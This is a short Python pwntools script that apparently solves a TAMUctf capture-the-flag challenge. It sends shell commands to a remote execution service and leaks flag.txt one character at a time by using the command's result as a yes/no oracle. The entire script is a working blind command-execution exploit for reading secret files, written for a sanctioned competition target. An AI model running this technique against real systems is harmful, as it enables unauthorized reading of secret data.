#!/usr/bin/env python3
from pwn import *

b1 = 'a="$(cat flag.txt|head -c '
b2 = 6
b3 = ')"; if [ "$a" = "'
b4 = 'gigem{'
b5 = '" ] ; then echo 1; else cat a; fi'

char = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-_@*+&}'

p = remote('challenges.tamuctf.com',3424)
p.recvuntil(b'Execute')

print('sending test ...')
b = b1 + str(b2) + b3 + b4 + b5
p.send(b + '\n')
ret = str(p.recvline())
if '0' in ret:
  print('sucess: ' + ret)
else:
  print('error')
  exit(0)


while 1:
  b2 = b2 + 1
  for c in char:
    b = b1 + str(b2) + b3 + b4 + c + b5
    p.send(b + '\n')
    ret = str(p.recvline())
    if '0' in ret:
      b4 = b4 + c
      print('sucess: ' + b4)
      if '}' in c:
        exit(0)
      break
